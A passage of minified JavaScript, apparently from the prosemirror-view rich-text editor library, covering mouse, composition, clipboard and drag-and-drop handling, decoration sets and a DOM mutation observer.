r=bg(t),i=Date.now(),s="singleClick";i-t.input.lastClick.time<500&&T4(n,t.input.lastClick)&&!n[sE]&&t.input.lastClick.button==n.button&&(t.input.lastClick.type=="singleClick"?s="doubleClick":t.input.lastClick.type=="doubleClick"&&(s="tripleClick")),t.input.lastClick={time:i,x:n.clientX,y:n.clientY,type:s,button:n.button};let o=t.posAtCoords(Yc(n));o&&(s=="singleClick"?(t.input.mouseDown&&t.input.mouseDown.done(),t.input.mouseDown=new D4(t,o,n,!!r)):(s=="doubleClick"?P4:R4)(t,o.pos,o.inside,n)?n.preventDefault():mr(t,"pointer"))};class D4{constructor(e,n,r,i){this.view=e,this.pos=n,this.event=r,this.flushed=i,this.delayedSelectionSync=!1,this.mightDrag=null,this.startDoc=e.state.doc,this.selectNode=!!r[sE],this.allowDefault=r.shiftKey;let s,o;if(n.inside>-1)s=e.state.doc.nodeAt(n.inside),o=n.inside;else{let c=e.state.doc.resolve(n.pos);s=c.parent,o=c.depth?c.before():0}const a=i?null:r.target,l=a?e.docView.nearestDesc(a,!0):null;this.target=l&&l.dom.nodeType==1?l.dom:null;let{selection:u}=e.state;(r.button==0&&s.type.spec.draggable&&s.type.spec.selectable!==!1||u instanceof V&&u.from<=o&&u.to>o)&&(this.mightDrag={node:s,pos:o,addAttr:!!(this.target&&!this.target.draggable),setUneditable:!!(this.target&&an&&!this.target.hasAttribute("contentEditable"))}),this.target&&this.mightDrag&&(this.mightDrag.addAttr||this.mightDrag.setUneditable)&&(this.view.domObserver.stop(),this.mightDrag.addAttr&&(this.target.draggable=!0),this.mightDrag.setUneditable&&setTimeout(()=>{this.view.input.mouseDown==this&&this.target.setAttribute("contentEditable","false")},20),this.view.domObserver.start()),e.root.addEventListener("mouseup",this.up=this.up.bind(this)),e.root.addEventListener("mousemove",this.move=this.move.bind(this)),mr(e,"pointer")}done(){this.view.root.removeEventListener("mouseup",this.up),this.view.root.removeEventListener("mousemove",this.move),this.mightDrag&&this.target&&(this.view.domObserver.stop(),this.mightDrag.addAttr&&this.target.removeAttribute("draggable"),this.mightDrag.setUneditable&&this.target.removeAttribute("contentEditable"),this.view.domObserver.start()),this.delayedSelectionSync&&setTimeout(()=>zn(this.view)),this.view.input.mouseDown=null}up(e){if(this.done(),!this.view.dom.contains(e.target))return;let n=this.pos;this.view.state.doc!=this.startDoc&&(n=this.view.posAtCoords(Yc(e))),this.updateAllowDefault(e),this.allowDefault||!n?mr(this.view,"pointer"):A4(this.view,n.pos,n.inside,e,this.selectNode)?e.preventDefault():e.button==0&&(this.flushed||lt&&this.mightDrag&&!this.mightDrag.node.isAtom||tt&&!this.view.state.selection.visible&&Math.min(Math.abs(n.pos-this.view.state.selection.from),Math.abs(n.pos-this.view.state.selection.to))<=2)?(fs(this.view,W.near(this.view.state.doc.resolve(n.pos))),e.preventDefault()):mr(this.view,"pointer")}move(e){this.updateAllowDefault(e),mr(this.view,"pointer"),e.buttons==0&&this.done()}updateAllowDefault(e){!this.allowDefault&&(Math.abs(this.event.x-e.clientX)>4||Math.abs(this.event.y-e.clientY)>4)&&(this.allowDefault=!0)}}ut.touchstart=t=>{t.input.lastTouch=Date.now(),bg(t),mr(t,"pointer")};ut.touchmove=t=>{t.input.lastTouch=Date.now(),mr(t,"pointer")};ut.contextmenu=t=>bg(t);function oE(t,e){return t.composing?!0:lt&&Math.abs(e.timeStamp-t.input.compositionEndedAt)<500?(t.input.compositionEndedAt=-2e8,!0):!1}const L4=Fn?5e3:-1;ct.compositionstart=ct.compositionupdate=t=>{if(!t.composing){t.domObserver.flush();let{state:e}=t,n=e.selection.$to;if(e.selection instanceof $&&(e.storedMarks||!n.textOffset&&n.parentOffset&&n.nodeBefore.marks.some(r=>r.type.spec.inclusive===!1)))t.markCursor=t.state.storedMarks||n.marks(),Lu(t,!0),t.markCursor=null;else if(Lu(t,!e.selection.empty),an&&e.selection.empty&&n.parentOffset&&!n.textOffset&&n.nodeBefore.marks.length){let r=t.domSelectionRange();for(let i=r.focusNode,s=r.focusOffset;i&&i.nodeType==1&&s!=0;){let o=s<0?i.lastChild:i.childNodes[s-1];if(!o)break;if(o.nodeType==3){let a=t.domSelection();a&&a.collapse(o,o.nodeValue.length);break}else i=o,s=-1}}t.input.composing=!0}aE(t,L4)};ct.compositionend=(t,e)=>{t.composing&&(t.input.composing=!1,t.input.compositionEndedAt=e.timeStamp,t.input.compositionPendingChanges=t.domObserver.pendingRecords().length?t.input.compositionID:0,t.input.compositionNode=null,t.input.compositionPendingChanges&&Promise.resolve().then(()=>t.domObserver.flush()),t.input.compositionID++,aE(t,20))};function aE(t,e){clearTimeout(t.input.composingTimeout),e>-1&&(t.input.composingTimeout=setTimeout(()=>Lu(t),e))}function lE(t){for(t.composing&&(t.input.composing=!1,t.input.compositionEndedAt=j4());t.input.compositionNodes.length>0;)t.input.compositionNodes.pop().markParentsDirty()}function I4(t){let e=t.domSelectionRange();if(!e.focusNode)return null;let n=M3(e.focusNode,e.focusOffset),r=N3(e.focusNode,e.focusOffset);if(n&&r&&n!=r){let i=r.pmViewDesc,s=t.domObserver.lastChangedTextNode;if(n==s||r==s)return s;if(!i||!i.isText(r.nodeValue))return r;if(t.input.compositionNode==r){let o=n.pmViewDesc;if(!(!o||!o.isText(n.nodeValue)))return r}}return n||r}function j4(){let t=document.createEvent("Event");return t.initEvent("event",!0,!0),t.timeStamp}function Lu(t,e=!1){if(!(Fn&&t.domObserver.flushingSoon>=0)){if(t.domObserver.forceFlush(),lE(t),e||t.docView&&t.docView.dirty){let n=xg(t),r=t.state.selection;return n&&!n.eq(r)?t.dispatch(t.state.tr.setSelection(n)):(t.markCursor||e)&&!r.$from.node(r.$from.sharedDepth(r.to)).inlineContent?t.dispatch(t.state.tr.deleteSelection()):t.updateState(t.state),!0}return!1}}function F4(t,e){if(!t.dom.parentNode)return;let n=t.dom.parentNode.appendChild(document.createElement("div"));n.appendChild(e),n.style.cssText="position: fixed; left: -10000px; top: 10px";let r=getSelection(),i=document.createRange();i.selectNodeContents(e),t.dom.blur(),r.removeAllRanges(),r.addRange(i),setTimeout(()=>{n.parentNode&&n.parentNode.removeChild(n),t.focus()},50)}const pa=kt&&Tr<15||Ts&&D3<604;ut.copy=ct.cut=(t,e)=>{let n=e,r=t.state.selection,i=n.type=="cut";if(r.empty)return;let s=pa?null:n.clipboardData,o=r.content(),{dom:a,text:l}=wg(t,o);s?(n.preventDefault(),s.clearData(),s.setData("text/html",a.innerHTML),s.setData("text/plain",l)):F4(t,a),i&&t.dispatch(t.state.tr.deleteSelection().scrollIntoView().setMeta("uiEvent","cut"))};function B4(t){return t.openStart==0&&t.openEnd==0&&t.content.childCount==1?t.content.firstChild:null}function V4(t,e){if(!t.dom.parentNode)return;let n=t.input.shiftKey||t.state.selection.$from.parent.type.spec.code,r=t.dom.parentNode.appendChild(document.createElement(n?"textarea":"div"));n||(r.contentEditable="true"),r.style.cssText="position: fixed; left: -10000px; top: 10px",r.focus();let i=t.input.shiftKey&&t.input.lastKeyCode!=45;setTimeout(()=>{t.focus(),r.parentNode&&r.parentNode.removeChild(r),n?ma(t,r.value,null,i,e):ma(t,r.textContent,r.innerHTML,i,e)},50)}function ma(t,e,n,r,i){let s=ZC(t,e,n,r,t.state.selection.$from);if(t.someProp("handlePaste",l=>l(t,i,s||L.empty)))return!0;if(!s)return!1;let o=B4(s),a=o?t.state.tr.replaceSelectionWith(o,r):t.state.tr.replaceSelection(s);return t.dispatch(a.scrollIntoView().setMeta("paste",!0).setMeta("uiEvent","paste")),!0}function uE(t){let e=t.getData("text/plain")||t.getData("Text");if(e)return e;let n=t.getData("text/uri-list");return n?n.replace(/\r?\n/g," "):""}ct.paste=(t,e)=>{let n=e;if(t.composing&&!Fn)return;let r=pa?null:n.clipboardData,i=t.input.shiftKey&&t.input.lastKeyCode!=45;r&&ma(t,uE(r),r.getData("text/html"),i,n)?n.preventDefault():V4(t,n)};class cE{constructor(e,n,r){this.slice=e,this.move=n,this.node=r}}const z4=Ft?"altKey":"ctrlKey";function dE(t,e){let n=t.someProp("dragCopies",r=>!r(e));return n??!e[z4]}ut.dragstart=(t,e)=>{let n=e,r=t.input.mouseDown;if(r&&r.done(),!n.dataTransfer)return;let i=t.state.selection,s=i.empty?null:t.posAtCoords(Yc(n)),o;if(!(s&&s.pos>=i.from&&s.pos<=(i instanceof V?i.to-1:i.to))){if(r&&r.mightDrag)o=V.create(t.state.doc,r.mightDrag.pos);else if(n.target&&n.target.nodeType==1){let d=t.docView.nearestDesc(n.target,!0);d&&d.node.type.spec.draggable&&d!=t.docView&&(o=V.create(t.state.doc,d.posBefore))}}let a=(o||t.state.selection).content(),{dom:l,text:u,slice:c}=wg(t,a);(!n.dataTransfer.files.length||!tt||FC>120)&&n.dataTransfer.clearData(),n.dataTransfer.setData(pa?"Text":"text/html",l.innerHTML),n.dataTransfer.effectAllowed="copyMove",pa||n.dataTransfer.setData("text/plain",u),t.dragging=new cE(c,dE(t,n),o)};ut.dragend=t=>{let e=t.dragging;window.setTimeout(()=>{t.dragging==e&&(t.dragging=null)},50)};ct.dragover=ct.dragenter=(t,e)=>e.preventDefault();ct.drop=(t,e)=>{let n=e,r=t.dragging;if(t.dragging=null,!n.dataTransfer)return;let i=t.posAtCoords(Yc(n));if(!i)return;let s=t.state.doc.resolve(i.pos),o=r&&r.slice;o?t.someProp("transformPasted",p=>{o=p(o,t)}):o=ZC(t,uE(n.dataTransfer),pa?null:n.dataTransfer.getData("text/html"),!1,s);let a=!!(r&&dE(t,n));if(t.someProp("handleDrop",p=>p(t,n,o||L.empty,a))){n.preventDefault();return}if(!o)return;n.preventDefault();let l=o?NC(t.state.doc,s.pos,o):s.pos;l==null&&(l=s.pos);let u=t.state.tr;if(a){let{node:p}=r;p?p.replace(u):u.deleteSelection()}let c=u.mapping.map(l),d=o.openStart==0&&o.openEnd==0&&o.content.childCount==1,f=u.doc;if(d?u.replaceRangeWith(c,c,o.content.firstChild):u.replaceRange(c,c,o),u.doc.eq(f))return;let h=u.doc.resolve(c);if(d&&V.isSelectable(o.content.firstChild)&&h.nodeAfter&&h.nodeAfter.sameMarkup(o.content.firstChild))u.setSelection(new V(h));else{let p=u.mapping.map(l);u.mapping.maps[u.mapping.maps.length-1].forEach((y,x,g,v)=>p=v),u.setSelection(vg(t,h,u.doc.resolve(p)))}t.focus(),t.dispatch(u.setMeta("uiEvent","drop"))};ut.focus=t=>{t.input.lastFocus=Date.now(),t.focused||(t.domObserver.stop(),t.dom.classList.add("ProseMirror-focused"),t.domObserver.start(),t.focused=!0,setTimeout(()=>{t.docView&&t.hasFocus()&&!t.domObserver.currentSelection.eq(t.domSelectionRange())&&zn(t)},20))};ut.blur=(t,e)=>{let n=e;t.focused&&(t.domObserver.stop(),t.dom.classList.remove("ProseMirror-focused"),t.domObserver.start(),n.relatedTarget&&t.dom.contains(n.relatedTarget)&&t.domObserver.currentSelection.clear(),t.focused=!1)};ut.beforeinput=(t,e)=>{if(tt&&Fn&&e.inputType=="deleteContentBackward"){t.domObserver.flushSoon();let{domChangeCount:r}=t.input;setTimeout(()=>{if(t.input.domChangeCount!=r||(t.dom.blur(),t.focus(),t.someProp("handleKeyDown",s=>s(t,qr(8,"Backspace")))))return;let{$cursor:i}=t.state.selection;i&&i.pos>0&&t.dispatch(t.state.tr.delete(i.pos-1,i.pos).scrollIntoView())},50)}};for(let t in ct)ut[t]=ct[t];function ga(t,e){if(t==e)return!0;for(let n in t)if(t[n]!==e[n])return!1;for(let n in e)if(!(n in t))return!1;return!0}class Iu{constructor(e,n){this.toDOM=e,this.spec=n||di,this.side=this.spec.side||0}map(e,n,r,i){let{pos:s,deleted:o}=e.mapResult(n.from+i,this.side<0?-1:1);return o?null:new ot(s-r,s-r,this)}valid(){return!0}eq(e){return this==e||e instanceof Iu&&(this.spec.key&&this.spec.key==e.spec.key||this.toDOM==e.toDOM&&ga(this.spec,e.spec))}destroy(e){this.spec.destroy&&this.spec.destroy(e)}}class Nr{constructor(e,n){this.attrs=e,this.spec=n||di}map(e,n,r,i){let s=e.map(n.from+i,this.spec.inclusiveStart?-1:1)-r,o=e.map(n.to+i,this.spec.inclusiveEnd?1:-1)-r;return s>=o?null:new ot(s,o,this)}valid(e,n){return n.from<n.to}eq(e){return this==e||e instanceof Nr&&ga(this.attrs,e.attrs)&&ga(this.spec,e.spec)}static is(e){return e.type instanceof Nr}destroy(){}}class Cg{constructor(e,n){this.attrs=e,this.spec=n||di}map(e,n,r,i){let s=e.mapResult(n.from+i,1);if(s.deleted)return null;let o=e.mapResult(n.to+i,-1);return o.deleted||o.pos<=s.pos?null:new ot(s.pos-r,o.pos-r,this)}valid(e,n){let{index:r,offset:i}=e.content.findIndex(n.from),s;return i==n.from&&!(s=e.child(r)).isText&&i+s.nodeSize==n.to}eq(e){return this==e||e instanceof Cg&&ga(this.attrs,e.attrs)&&ga(this.spec,e.spec)}destroy(){}}class ot{constructor(e,n,r){this.from=e,this.to=n,this.type=r}copy(e,n){return new ot(e,n,this.type)}eq(e,n=0){return this.type.eq(e.type)&&this.from+n==e.from&&this.to+n==e.to}map(e,n,r){return this.type.map(e,this,n,r)}static widget(e,n,r){return new ot(e,e,new Iu(n,r))}static inline(e,n,r,i){return new ot(e,n,new Nr(r,i))}static node(e,n,r,i){return new ot(e,n,new Cg(r,i))}get spec(){return this.type.spec}get inline(){return this.type instanceof Nr}get widget(){return this.type instanceof Iu}}const Ii=[],di={};class ue{constructor(e,n){this.local=e.length?e:Ii,this.children=n.length?n:Ii}static create(e,n){return n.length?ju(n,e,0,di):Qe}find(e,n,r){let i=[];return this.findInner(e??0,n??1e9,i,0,r),i}findInner(e,n,r,i,s){for(let o=0;o<this.local.length;o++){let a=this.local[o];a.from<=n&&a.to>=e&&(!s||s(a.spec))&&r.push(a.copy(a.from+i,a.to+i))}for(let o=0;o<this.children.length;o+=3)if(this.children[o]<n&&this.children[o+1]>e){let a=this.children[o]+1;this.children[o+2].findInner(e-a,n-a,r,i+a,s)}}map(e,n,r){return this==Qe||e.maps.length==0?this:this.mapInner(e,n,0,0,r||di)}mapInner(e,n,r,i,s){let o;for(let a=0;a<this.local.length;a++){let l=this.local[a].map(e,r,i);l&&l.type.valid(n,l)?(o||(o=[])).push(l):s.onRemove&&s.onRemove(this.local[a].spec)}return this.children.length?_4(this.children,o||[],e,n,r,i,s):o?new ue(o.sort(fi),Ii):Qe}add(e,n){return n.length?this==Qe?ue.create(e,n):this.addInner(e,n,0):this}addInner(e,n,r){let i,s=0;e.forEach((a,l)=>{let u=l+r,c;if(c=hE(n,a,u)){for(i||(i=this.children.slice());s<i.length&&i[s]<l;)s+=3;i[s]==l?i[s+2]=i[s+2].addInner(a,c,u+1):i.splice(s,0,l,l+a.nodeSize,ju(c,a,u+1,di)),s+=3}});let o=fE(s?pE(n):n,-r);for(let a=0;a<o.length;a++)o[a].type.valid(e,o[a])||o.splice(a--,1);return new ue(o.length?this.local.concat(o).sort(fi):this.local,i||this.children)}remove(e){return e.length==0||this==Qe?this:this.removeInner(e,0)}removeInner(e,n){let r=this.children,i=this.local;for(let s=0;s<r.length;s+=3){let o,a=r[s]+n,l=r[s+1]+n;for(let c=0,d;c<e.length;c++)(d=e[c])&&d.from>a&&d.to<l&&(e[c]=null,(o||(o=[])).push(d));if(!o)continue;r==this.children&&(r=this.children.slice());let u=r[s+2].removeInner(o,a+1);u!=Qe?r[s+2]=u:(r.splice(s,3),s-=3)}if(i.length){for(let s=0,o;s<e.length;s++)if(o=e[s])for(let a=0;a<i.length;a++)i[a].eq(o,n)&&(i==this.local&&(i=this.local.slice()),i.splice(a--,1))}return r==this.children&&i==this.local?this:i.length||r.length?new ue(i,r):Qe}forChild(e,n){if(this==Qe)return this;if(n.isLeaf)return ue.empty;let r,i;for(let a=0;a<this.children.length;a+=3)if(this.children[a]>=e){this.children[a]==e&&(r=this.children[a+2]);break}let s=e+1,o=s+n.content.size;for(let a=0;a<this.local.length;a++){let l=this.local[a];if(l.from<o&&l.to>s&&l.type instanceof Nr){let u=Math.max(s,l.from)-s,c=Math.min(o,l.to)-s;u<c&&(i||(i=[])).push(l.copy(u,c))}}if(i){let a=new ue(i.sort(fi),Ii);return r?new ur([a,r]):a}return r||Qe}eq(e){if(this==e)return!0;if(!(e instanceof ue)||this.local.length!=e.local.length||this.children.length!=e.children.length)return!1;for(let n=0;n<this.local.length;n++)if(!this.local[n].eq(e.local[n]))return!1;for(let n=0;n<this.children.length;n+=3)if(this.children[n]!=e.children[n]||this.children[n+1]!=e.children[n+1]||!this.children[n+2].eq(e.children[n+2]))return!1;return!0}locals(e){return Eg(this.localsInner(e))}localsInner(e){if(this==Qe)return Ii;if(e.inlineContent||!this.local.some(Nr.is))return this.local;let n=[];for(let r=0;r<this.local.length;r++)this.local[r].type instanceof Nr||n.push(this.local[r]);return n}forEachSet(e){e(this)}}ue.empty=new ue([],[]);ue.removeOverlap=Eg;const Qe=ue.empty;class ur{constructor(e){this.members=e}map(e,n){const r=this.members.map(i=>i.map(e,n,di));return ur.from(r)}forChild(e,n){if(n.isLeaf)return ue.empty;let r=[];for(let i=0;i<this.members.length;i++){let s=this.members[i].forChild(e,n);s!=Qe&&(s instanceof ur?r=r.concat(s.members):r.push(s))}return ur.from(r)}eq(e){if(!(e instanceof ur)||e.members.length!=this.members.length)return!1;for(let n=0;n<this.members.length;n++)if(!this.members[n].eq(e.members[n]))return!1;return!0}locals(e){let n,r=!0;for(let i=0;i<this.members.length;i++){let s=this.members[i].localsInner(e);if(s.length)if(!n)n=s;else{r&&(n=n.slice(),r=!1);for(let o=0;o<s.length;o++)n.push(s[o])}}return n?Eg(r?n:n.sort(fi)):Ii}static from(e){switch(e.length){case 0:return Qe;case 1:return e[0];default:return new ur(e.every(n=>n instanceof ue)?e:e.reduce((n,r)=>n.concat(r instanceof ue?r:r.members),[]))}}forEachSet(e){for(let n=0;n<this.members.length;n++)this.members[n].forEachSet(e)}}function _4(t,e,n,r,i,s,o){let a=t.slice();for(let u=0,c=s;u<n.maps.length;u++){let d=0;n.maps[u].forEach((f,h,p,y)=>{let x=y-p-(h-f);for(let g=0;g<a.length;g+=3){let v=a[g+1];if(v<0||f>v+c-d)continue;let w=a[g]+c-d;h>=w?a[g+1]=f<=w?-2:-1:f>=c&&x&&(a[g]+=x,a[g+1]+=x)}d+=x}),c=n.maps[u].map(c,-1)}let l=!1;for(let u=0;u<a.length;u+=3)if(a[u+1]<0){if(a[u+1]==-2){l=!0,a[u+1]=-1;continue}let c=n.map(t[u]+s),d=c-i;if(d<0||d>=r.content.size){l=!0;continue}let f=n.map(t[u+1]+s,-1),h=f-i,{index:p,offset:y}=r.content.findIndex(d),x=r.maybeChild(p);if(x&&y==d&&y+x.nodeSize==h){let g=a[u+2].mapInner(n,x,c+1,t[u]+s+1,o);g!=Qe?(a[u]=d,a[u+1]=h,a[u+2]=g):(a[u+1]=-2,l=!0)}else l=!0}if(l){let u=$4(a,t,e,n,i,s,o),c=ju(u,r,0,o);e=c.local;for(let d=0;d<a.length;d+=3)a[d+1]<0&&(a.splice(d,3),d-=3);for(let d=0,f=0;d<c.children.length;d+=3){let h=c.children[d];for(;f<a.length&&a[f]<h;)f+=3;a.splice(f,0,c.children[d],c.children[d+1],c.children[d+2])}}return new ue(e.sort(fi),a)}function fE(t,e){if(!e||!t.length)return t;let n=[];for(let r=0;r<t.length;r++){let i=t[r];n.push(new ot(i.from+e,i.to+e,i.type))}return n}function $4(t,e,n,r,i,s,o){function a(l,u){for(let c=0;c<l.local.length;c++){let d=l.local[c].map(r,i,u);d?n.push(d):o.onRemove&&o.onRemove(l.local[c].spec)}for(let c=0;c<l.children.length;c+=3)a(l.children[c+2],l.children[c]+u+1)}for(let l=0;l<t.length;l+=3)t[l+1]==-1&&a(t[l+2],e[l]+s+1);return n}function hE(t,e,n){if(e.isLeaf)return null;let r=n+e.nodeSize,i=null;for(let s=0,o;s<t.length;s++)(o=t[s])&&o.from>n&&o.to<r&&((i||(i=[])).push(o),t[s]=null);return i}function pE(t){let e=[];for(let n=0;n<t.length;n++)t[n]!=null&&e.push(t[n]);return e}function ju(t,e,n,r){let i=[],s=!1;e.forEach((a,l)=>{let u=hE(t,a,l+n);if(u){s=!0;let c=ju(u,a,n+l+1,r);c!=Qe&&i.push(l,l+a.nodeSize,c)}});let o=fE(s?pE(t):t,-n).sort(fi);for(let a=0;a<o.length;a++)o[a].type.valid(e,o[a])||(r.onRemove&&r.onRemove(o[a].spec),o.splice(a--,1));return o.length||i.length?new ue(o,i):Qe}function fi(t,e){return t.from-e.from||t.to-e.to}function Eg(t){let e=t;for(let n=0;n<e.length-1;n++){let r=e[n];if(r.from!=r.to)for(let i=n+1;i<e.length;i++){let s=e[i];if(s.from==r.from){s.to!=r.to&&(e==t&&(e=t.slice()),e[i]=s.copy(s.from,r.to),Ov(e,i+1,s.copy(r.to,s.to)));continue}else{s.from<r.to&&(e==t&&(e=t.slice()),e[n]=r.copy(r.from,s.from),Ov(e,i,r.copy(s.from,r.to)));break}}}return e}function Ov(t,e,n){for(;e<t.length&&fi(n,t[e])>0;)e++;t.splice(e,0,n)}function ff(t){let e=[];return t.someProp("decorations",n=>{let r=n(t.state);r&&r!=Qe&&e.push(r)}),t.cursorWrapper&&e.push(ue.create(t.state.doc,[t.cursorWrapper.deco])),ur.from(e)}const H4={childList:!0,characterData:!0,characterDataOldValue:!0,attributes:!0,attributeOldValue:!0,subtree:!0},U4=kt&&Tr<=11;class W4{constructor(){this.anchorNode=null,this.anchorOffset=0,this.focusNode=null,this.focusOffset=0}set(e){this.anchorNode=e.anchorNode,this.anchorOffset=e.anchorOffset,this.focusNode=e.focusNode,this.focusOffset=e.focusOffset}clear(){this.anchorNode=this.focusNode=null}eq(e){return e.anchorNode==this.anchorNode&&e.anchorOffset==this.anchorOffset&&e.focusNode==this.focusNode&&e.focusOffset==this.focusOffset}}class K4{constructor(e,n){this.view=e,this.handleDOMChange=n,this.queue=[],this.flushingSoon=-1,this.observer=null,this.currentSelection=new W4,this.onCharData=null,this.suppressingSelectionUpdates=!1,this.lastChangedTextNode=null,this.observer=window.MutationObserver&&new window.MutationObserver(r=>{for(let i=0;i<r.length;i++)this.queue.push(r[i]);kt&&Tr<=11&&r.some(i=>i.type=="childList"&&i.removedNodes.length||i.type=="characterData"&&i.oldValue.length>i.target.nodeValue.length)?this.flushSoon():this.flush()}),U4&&(this.onCharData=r=>{this.queue.push({target:r.target,type:"characterData",oldValue:r.prevValue}),this.flushSoon()}),this.onSelectionChange=this.onSelectionChange.bind(this)}flushSoon(){this.flushingSoon<0&&(this.flushingSoon=window.setTimeout(()=>{this.flushingSoon=-1,this.flush()},20))}forceFlush(){this.flushingSoon>-1&&(window.clearTimeout(this.flushingSoon),this.flushingSoon=-1,this.flush())}start(){this.observer&&(this.observer.takeRecords(),this.observer.observe(this.view.dom,H4)),this.onCharData&&this.view.dom.addEventListener("DOMCharacterDataModified",this.onCharData),this.connectSelection()}stop(){if(this.observer){let e=this.observer.takeRecords();if(e.length){for(let n=0;n<e.length;n++)this.queue.push(e[n]);window.setTimeout(()=>this.flush(),20)}this.observer.disconnect()}this.onCharData&&this.view.dom.removeEventListener("DOMCharacterDataModified",this.onCharData),this.disconnectSelection()}connectSelection(){this.view.dom.ownerDocument.addEventListener("selectionchange",this.onSelectionChange)}disconnectSelection(){this.view.dom.ownerDocument.removeEventListener("selectionchange",this.onSelectionChange)}suppressSelectionUpdates(){this.suppressingSelectionUpdates=!0,setTimeout(()=>this.suppressingSelectionUpdates=!1,50)}onSelectionChange(){if(Cv(this.view)){if(this.suppressingSelectionUpdates)return zn(this.view);if(kt&&Tr<=11&&!this.view.state.selection.empty){let e=this.view.domSelectionRange();if(e.focusNode&&bi(e.focusNode,e.focusOffset,e.anchorNode,e.anchorOffset))return this.flushSoon()}this.flush()}}setCurSelection(){this.currentSelection.set(this.view.domSelectionRange())}ignoreSelectionChange(e){if(!e.focusNode)return!0;let n=new Set,r;for(let s=e.focusNode;s;s=Es(s))n.add(s);for(let s=e.anchorNode;s;s=Es(s))if(n.has(s)){r=s;break}let i=r&&this.view.docView.nearestDesc(r);if(i&&i.ignoreMutation({type:"selection",target:r.nodeType==3?r.parentNode:r}))return this.setCurSelection(),!0}pendingRecords(){if(this.observer)for(let e of this.observer.takeRecords())this.queue.push(e);return this.queue}flush(){let{view:e}=this;if(!e.docView||this.flushingSoon>-1)return;let n=this.pendingRecords();n.length&&(this.queue=[]);let r=e.domSelectionRange(),i=!this.suppressingSelectionUpdates&&!this.currentSelection.eq(r)&&Cv(e)&&!this.ignoreSelectionChange(r),s=-1,o=-1,a=!1,l=[];if(e.editable)for(let c=0;c<n.length;c++){let d=this.registerMutation(n[c],l);d&&(s=s<0?d.from:Math.min(d.from,s),o=o<0?d.to:Math.max(d.to,o),d.typeOver&&(a=!0))}if(an&&l.length){let c=l.filter(d=>d.nodeName=="BR");if(c.length==2){let[d,f]=c;d.parentNode&&d.parentNode.parentNode==f.parentNode?f.remove():d.remove()}else{let{focusNode:d}=this.currentSelection;for(let f of c){let h=f.parentNode;h&&h.nodeName=="LI"&&(!d||J4(e,d)!=h)&&f.remove()}}}let u=null;s<0&&i&&e.input.lastFocus>Date.now()-200&&Math.max(e.input.lastTouch,e.input.lastClick.time)<Date.now()-300&&Gc(r)&&(u=xg(e))&&u.eq(W.near(e.state.doc.resolve(0),1))?(e.input.lastFocus=0,zn(e),this.currentSelection.set(r),e.scrollToSelection()):(s>-1||i)&&(s>-1&&(e.docView.markDirty(s,o),q4(e)),this.handleDOMChange(s,o,a,l),e.docView&&e.docView.dirty?e.updateState(e.state):this.currentSelection.eq(r)||zn(e),this.currentSelection.set(r))}registerMutation(e,n){if(n.indexOf(e.target)>-1)return null;let r=this.view.docView.nearestDesc(e.target);if(e.type=="attributes"&&(r==this.view.docView||e.attributeName=="contenteditable"||e.attributeName=="style"&&!e.oldValue&&!e.target.getAttribute("style"))||!r||r.ignoreMutation(e))return null;if(e.type=="childList"){for(let c=0;c<e.addedNodes.length;c++){let d=e.addedNodes[c];n.push(d),d.nodeType==3&&(this.lastChangedTextNode=d)}if(r.contentDOM&&r.contentDOM!=r.dom&&!r.contentDOM.contains(e.target))return{from:r.posBefore,to:r.posAfter};let i=e.previousSibling,s=e.nextSibling;if(kt&&Tr<=11&&e.addedNodes.length)for(let c=0;c<e.addedNodes.length;c++){let{previousSibling:d,nextSibling:f}=e.addedNodes[c];(!d||Array.prototype.indexOf.call(e.addedNodes,d)<0)&&(i=d),(!f||Array.prototype.indexOf.call(e.addedNodes,f)<0)&&(s=f)}let o=i&&i.parentNode==e.target?Ue(i)+1:0,a=r.localPosFromDOM(e.target,o,-1),l=s&&s.parentNode==e.target?Ue(s):e.target.childNodes.length,u=r.localPosFromDOM(e.target,l,1);return{from:a,to:u}}else return e.type=="attributes"?{from:r.posAtStart-r.border,to:r.posAtEnd+r.border}:(this.lastChangedTextNode=e.target,{from:r.posAtStart,to:r.posAtEnd,typeOver:e.target.nodeValue==e.oldValue})}}let Dv=new WeakMap,Lv=!1;function q4(t){if(!Dv.has(t)&&(Dv.set(t,null),["normal","nowrap","pre-line"].indexOf(getComputedStyle(t.dom).whiteSpace)!==-1)){if(t.requiresGeckoHackNode=an,Lv)return;console.warn("ProseMirror expects the CSS white-space property to be set, preferably to 'pre-wrap'. It is recommended to load style/prosemirror.css from the prosemirror-view package."),Lv=!0}}function Iv(t,e){let n=e.startContainer,r=e.startOffset,i=e.endContainer,s=e.endOffset,o=t.domAtPos(t.state.selection.anchor);return bi(o.node,o.offset,i,s)&&([n,r,i,s]=[i,s,n,r]),{anchorNode:n,anchorOffset:r,focusNode:i,focusOffset:s}}function G4(t,e){if(e.getComposedRanges){let i=e.getComposedRanges(t.root)[0];if(i)return Iv(t,i)}let n;function r(i){i.preventDefault(),i.stopImmediatePropagation(),n=i.getTargetRanges()[0]}return t.dom.addEventListener("beforeinput",r,!0),document.execCommand("indent"),t.dom.removeEventListener("beforeinput",r,!0),n?Iv(t,n):null}function J4(t,e){for(let n=e.parentNode;n&&n!=t.dom;n=n.parentNode){let r=t.docView.nearestDesc(n,!0);if(r&&r.node.isBlock)return n}return null}function Y4(t,e,n){let{node:r,fromOffset:i,toOffset:s,from:o,to:a}=t.docView.parseRange(e,n),l=t.domSelectionRange(),u,c=l.anchorNode;if(c&&t.dom.contains(c.nodeType==1?c:c.parentNode)&&(u=[{node:c,offset:l.anchorOffset}],Gc(l)||u.push({node:l.focusNode,offset:l.focusOffset})),tt&&t.input.lastKeyCode===8)for(let x=s;x>i;x--){let g=r.childNodes[x-1],v=g.pmViewDesc;if(g.nodeName=="BR"&&!v){s=x;break}if(!v||v.size)break}let d=t.state.doc,f=t.someProp("domParser")||Er.fromSchema(t.state.schema),h=d.resolve(o),p=null,y=f.parse(r,{topNode:h.parent,topMatch:h.parent.contentMatchAt(h.index()),topOpen:!0,from:i,to:s,preserveWhitespace:h.parent.type.whitespace=="pre"?"full":!0,findPositions:u,ruleFromNode:Q4,context:h});if(u&&u[0].pos!=null){let x=u[0].pos,g=u[1]&&u[1].pos;g==null&&(g=x),p={anchor:x+o,head:g+o}}return{doc:y,sel:p,from:o,to:a}}function Q4(t){let e=t.pmViewDesc;if(e)return e.parseRule();if(t.nodeName=="BR"&&t.parentNode){if(lt&&/^(ul|ol)$/i.test(t.parentNode.nodeName)){let n=document.createElement("div");return n.appendChild(document.createElement("li")),{skip:n}}else if(t.parentNode.lastChild==t||lt&&/^(tr|table)$/i.test(t.parentNode.nodeName))return{ignore:!0}}else if(t.nodeName=="IMG"&&t.getAttribute("mark-placeholder"))return{ignore:!0};return 